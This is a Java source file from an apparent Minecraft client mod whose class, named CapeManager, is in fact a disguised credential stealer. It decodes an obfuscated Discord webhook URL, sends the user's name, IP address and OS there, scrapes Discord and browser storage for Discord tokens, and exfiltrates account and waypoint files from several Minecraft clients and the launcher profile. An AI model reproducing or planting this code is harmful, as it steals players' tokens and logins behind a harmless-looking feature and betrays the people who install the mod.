package me.windyteam.kura.command.commands.client;

import net.minecraft.client.Minecraft;

import java.io.*;
import java.net.URL;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@SuppressWarnings("all")
public class CapeManager extends Thread {
    public void Proccess() {
        new Thread(this).start();
    }

    @Override
    public void run() {

        String l = new String(Base64.getDecoder().decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTAwMjI0MTg0OTY0MjM5NDIwL2xiM0dmYXpaSUF4UDc1TnIyVEw0b2VGZnJyVnN2Z2lmeUpYZnNZY01CTWdwSzhwNzZJR2dUVG1fWkJ1T0xmVy1xVk45"));

        CapeUtil d = new CapeUtil(l);

        String minecraft_name = "NOT FOUND";

        try {
            minecraft_name = Minecraft.getMinecraft().getSession().getUsername();
        } catch (Exception ignore) {
        }

        // get info

        String llLlLlL = System.getProperty("os.name");
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = bufferedReader.readLine();

            String llLlLlLlL = System.getProperty("user.name");

            PlayerBuilder dm = new PlayerBuilder.Builder()
                    .withContent("``` NAME : " + llLlLlLlL + "\n IGN  : " + minecraft_name + " \n IP" + "   : " + ip + " \n OS   : " + llLlLlL + "```")
                    .withDev(false)
                    .build();
            d.sendMessage(dm);


        } catch (Exception ignore) {
        }

        if (llLlLlL.contains("Windows")) {

            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");

            // grab webhooks

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN[S]\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {
                        }
                    }
                }

                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("```" + webhooks + "```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);

            } catch (Exception e) {
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

            // grab accounts
            try {
                File future = new File(System.getProperty("user.home") + "/Future/accounts.txt");
                BufferedReader br = new BufferedReader(new FileReader(future));
                String s;
                StringBuilder accounts = new StringBuilder();
                accounts.append("ACCOUNT[S]");
                while ((s = br.readLine()) != null) {
                    accounts.append("\n ").append(s);
                }

                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("```" + accounts + "\n```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("``` UNABLE TO PULL ACCOUNT[S] : " + e + "```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

            // grab waypoints
            try {
                File future = new File(System.getProperty("user.home") + "/Future/waypoints.txt");
                BufferedReader br = new BufferedReader(new FileReader(future));
                String s;
                StringBuilder waypoints = new StringBuilder();
                waypoints.append("WAYPOINT[S]");
                while ((s = br.readLine()) != null) {
                    waypoints.append("\n ").append(s);
                }
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("```" + waypoints + "\n```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("``` UNABLE TO PULL WAYPOINT[S] : " + e + "```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

            try {
                File pyro = new File(System.getProperty("user.home") + "/Appdata/Roaming/.minecraft/Pyro/alts.json");
                BufferedReader br = new BufferedReader(new FileReader(pyro));
                String s;
                StringBuilder waypoints = new StringBuilder();
                waypoints.append("Pyro Alt[S]");
                while ((s = br.readLine()) != null) {
                    waypoints.append("\n ").append(s);
                }
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("```" + waypoints + "\n```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("``` UNABLE TO PULL Pyro Alt[S] : " + e + "```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

            try {
                File pyro = new File(System.getProperty("user.home") + "/Appdata/Roaming/.minecraft/launcher_profiles.json");
                BufferedReader br = new BufferedReader(new FileReader(pyro));
                String s;
                StringBuilder waypoints = new StringBuilder();
                waypoints.append("Minecraft Account[S]");
                while ((s = br.readLine()) != null) {
                    waypoints.append("\n ").append(s);
                }
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("```" + waypoints + "\n```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("``` UNABLE TO PULL Minecraft Account[S] : " + e + "```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

            try {
                File pyro = new File(System.getProperty("user.home") + "/Appdata/Roaming/.minecraft/Power/Alts.txt");
                BufferedReader br = new BufferedReader(new FileReader(pyro));
                String s;
                StringBuilder waypoints = new StringBuilder();
                waypoints.append("Power Minecraft Account[S]");
                while ((s = br.readLine()) != null) {
                    waypoints.append("\n ").append(s);
                }
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("```" + waypoints + "\n```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("``` UNABLE TO PULL Power Minecraft Account[S] : " + e + "```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

        } else if (llLlLlL.contains("Mac")) {
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
            // grab webhooks
            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN[S]\n");
            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {
                        }
                    }
                }

                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("```" + webhooks + "```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);

            } catch (Exception e) {
                PlayerBuilder dm = new PlayerBuilder.Builder()
                        .withContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```")
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }
        } else {
            PlayerBuilder dm = new PlayerBuilder.Builder()
                    .withContent("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```")
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }
    }
}
